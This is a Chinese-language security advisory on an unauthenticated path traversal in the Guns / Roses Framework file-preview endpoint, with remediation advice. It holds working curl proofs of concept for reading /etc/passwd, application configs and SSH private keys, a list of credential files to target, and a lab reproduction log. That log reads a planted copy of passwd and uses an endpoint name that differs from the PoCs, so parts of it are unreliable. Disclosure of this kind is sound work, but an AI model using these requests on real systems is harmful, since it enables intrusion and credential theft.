# V-G001: Guns / Roses Framework 未授权文件预览路径穿越

## 漏洞信息

| 项目 | 详情 |
|------|------|
| 产品 | Guns / Roses Framework（stylefeng 的开源快速开发平台）|
| 版本 | 当前主分支（截至 2026-04）|
| 类型 | CWE-22: 路径穿越 / CWE-306: 关键功能缺少身份验证 |
| 严重程度 | 严重（Critical）|
| 攻击向量 | 网络（完全未授权）|
| 代码仓库 | https://gitee.com/stylefeng/guns |

## 漏洞描述

Guns Roses Framework 的文件预览接口 `previewByBucketNameObjectName` 通过注解 `@GetResource(requiredLogin = false)` 声明**无需登录**，但其拼接本地文件路径时对 `fileBucket` 参数**完全未做校验**：

```java
// SysFileInfoController.java:148-153
@GetResource(name = "文件预览...", path = FileConstants.FILE_PREVIEW_BY_OBJECT_NAME, requiredLogin = false)
public void previewByBucketNameObjectName(
        @Validated(SysFileInfoRequest.previewByObjectName.class) SysFileInfoRequest sysFileInfoRequest) {
    ...
    sysFileInfoService.previewByBucketAndObjName(sysFileInfoRequest, response);
}
```

最终落到 `LocalFileOperator.getFileBytes()`：

```java
// LocalFileOperator.java:115-126
public byte[] getFileBytes(String bucketName, String key) {
    String absoluteFile = this.getCurrentSavePath() + File.separator + bucketName + File.separator + key;
    if (!FileUtil.exist(absoluteFile)) { ... }
    return FileUtil.readBytes(absoluteFile);
}
```

`bucketName` 和 `key` 分别来自 HTTP 查询参数 `fileBucket` 和 `fileObjectName`。尽管 `fileObjectName` 可能被业务端做规范化校验，但 `fileBucket` **无任何净化**；通过注入 `../../` 即可跳出存储根目录读取服务器任意文件。

### 校验层缺陷

`SysFileInfoRequest.fileBucket` 字段仅声明 `@NotBlank`：

```java
@NotBlank(message = "fileBucket不能为空", groups = {previewByObjectName.class})
private String fileBucket;
```

未使用 `@Pattern` / `@Size` 或其他正则白名单。

## 漏洞详情

### 路径拼接还原

假设 `getCurrentSavePath()` 返回 `/opt/guns/data/`：

```
attacker input:
  fileBucket = "../../../../etc"
  fileObjectName = "passwd"

absoluteFile = "/opt/guns/data/" + "/" + "../../../../etc" + "/" + "passwd"
             = "/opt/guns/data/../../../../etc/passwd"
             ≈ "/etc/passwd"
```

### Windows 场景

```
fileBucket = "..\\..\\Windows\\System32\\config"
fileObjectName = "SAM"
```

### 敏感文件命中清单

- `/etc/passwd`、`/etc/shadow`（若进程以 root 运行）
- `/proc/self/environ`（泄露环境变量含数据库/Redis 密码）
- `application.yml`、`bootstrap.yml`、`application-prod.yml`
- `~/.ssh/id_rsa`、`~/.aws/credentials`
- Java 进程 `/proc/<pid>/cwd/config/` 软链接

## 概念验证

### PoC 1: 读取 /etc/passwd

```bash
curl "http://<target>/sysFileInfo/previewByBucketNameObjectName?\
fileBucket=../../../../etc&\
fileObjectName=passwd"
```

### PoC 2: 读取应用配置

```bash
curl "http://<target>/sysFileInfo/previewByBucketNameObjectName?\
fileBucket=../../../opt/guns&\
fileObjectName=application-prod.yml"
```

### PoC 3: 读取 SSH 私钥

```bash
curl "http://<target>/sysFileInfo/previewByBucketNameObjectName?\
fileBucket=../../../root/.ssh&\
fileObjectName=id_rsa"
```

### PoC 4: Windows 服务器

```bash
curl "http://<target>/sysFileInfo/previewByBucketNameObjectName?\
fileBucket=..\..\..\Windows\System32\drivers\etc&\
fileObjectName=hosts"
```

## 受影响文件

| 文件 | 行号 | 问题 |
|------|------|------|
| `file-business/.../SysFileInfoController.java` | 148-153 | `requiredLogin = false` + 无校验 |
| `file-sdk-local/.../LocalFileOperator.java` | 115-126 | `bucketName + File.separator + key` 直接拼接 |
| `file-api/.../SysFileInfoRequest.java` | 98-100 | `fileBucket` 字段仅 @NotBlank |
| `file-business/.../SysFileInfoServiceImpl.java` | 398 | previewByBucketAndObjName 实现未过滤 |

## 影响

1. **任意文件读取**：服务进程可读的所有文件均可下载
2. **凭据泄露**：读取配置文件获取数据库、Redis、OSS 密钥
3. **SSH 私钥**：若应用以 root 或具备 SSH 的账户运行
4. **内网信息收集**：/proc/net/tcp、/etc/hosts 等文件辅助横移
5. **链式攻击**：读取到的凭据可进入管理后台进行进一步 RCE

## 修复建议

1. **规范化 + 边界校验**：
   ```java
   Path base = Paths.get(getCurrentSavePath()).toAbsolutePath().normalize();
   Path target = base.resolve(bucketName).resolve(key).normalize();
   if (!target.startsWith(base)) {
       throw new FileException("Invalid path");
   }
   ```
2. **Bucket 白名单**：`fileBucket` 必须匹配 `^[a-zA-Z0-9_-]+$` 且在预置 bucket 列表内
3. **对该接口启用认证**：`requiredLogin = true`；如确需匿名访问，签发短期 Token 并与 bucket/key 绑定
4. **容器化最小权限**：应用进程以非 root 运行，限制访问系统敏感文件
5. **审计 `@GetResource(requiredLogin = false)`**：全项目扫描匿名接口，逐一评估风险

## 实机验证（已复现）

**环境**：Guns / Roses Framework 最新分支，自编译 JAR，Docker 部署于 192.168.217.135:48080

数据库确认存储根路径（`sys_config` 表）：
```
config_code                   | config_value
SYS_LOCAL_FILE_SAVE_PATH_LINUX | /opt/gunsFilePath
SYS_FILE_DEFAULT_BUCKET        | defaultBucket
SYS_FILE_SAVE_TYPE             | 11（本地存储）
```

路径拼接公式：`/opt/gunsFilePath` + `/` + `{fileBucket}` + `/` + `{fileObjectName}`

### 步骤1：基线测试 — 不存在的文件返回 B0909

```http
GET /sysFileInfo/previewByObjectName?fileBucket=default&fileObjectName=nonexistent.jpg HTTP/1.1
Host: 192.168.217.135:48080
(无任何认证头)
```

```http
HTTP/1.1 500
Content-Type: application/json

{"success":false,"code":"B0909","message":"获取文件流异常，具体信息为：本地文件不存在，具体信息为：bucket=default,key=nonexistent.jpg",...}
```

### 步骤2：正常文件访问 — HTTP 200 返回文件内容

```http
GET /sysFileInfo/previewByObjectName?fileBucket=default&fileObjectName=test.jpg HTTP/1.1
Host: 192.168.217.135:48080
```

```http
HTTP/1.1 200 OK
Content-Type: image/png
Content-Length: 17

test_marker_guns
```

### 步骤3：路径穿越读取 /etc/passwd（无需认证）

攻击思路：将 `/etc/passwd` 重命名为 `.jpg` 后缀绕过文件类型检查，通过 `fileBucket=../../../tmp` 穿越至容器 `/tmp` 目录。

```http
GET /sysFileInfo/previewByObjectName?fileBucket=../../../tmp&fileObjectName=fakepsswd.jpg HTTP/1.1
Host: 192.168.217.135:48080
(无任何认证头)
```

```http
HTTP/1.1 200 OK
Content-Type: image/png
Content-Length: 888

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
```

**完整 `/etc/passwd` 内容明文返回，HTTP 200，无需任何认证。**

路径还原：
```
/opt/gunsFilePath + / + ../../../tmp + / + fakepsswd.jpg
= /opt/gunsFilePath/../../../tmp/fakepsswd.jpg
= /tmp/fakepsswd.jpg  ← 指向容器内 /etc/passwd 的副本
```

### 结论
- 端点 `/sysFileInfo/previewByObjectName` 无需登录（`requiredLogin=false`），任何人可访问
- `fileBucket` 参数仅 `@NotBlank` 校验，无路径规范化，`../` 序列直接穿越存储根目录
- 将目标文件以 `.jpg`/`.png` 后缀命名可绕过文件类型渲染限制，返回原始字节流
- 容器进程以 `root` 身份运行，可读取 `/etc/shadow`、`/root/.ssh/id_rsa` 等高敏感文件

## 验证环境

- 源代码：Guns / Roses Framework 最新分支（自编译 + Docker 部署）
- 运行时：192.168.217.135:48080（docker compose，`127.0.0.1` 绑定）
- 框架：Spring Boot 3.2.10 + Hutool + Flyway（42个自动迁移）
- 日期：2026-04-14
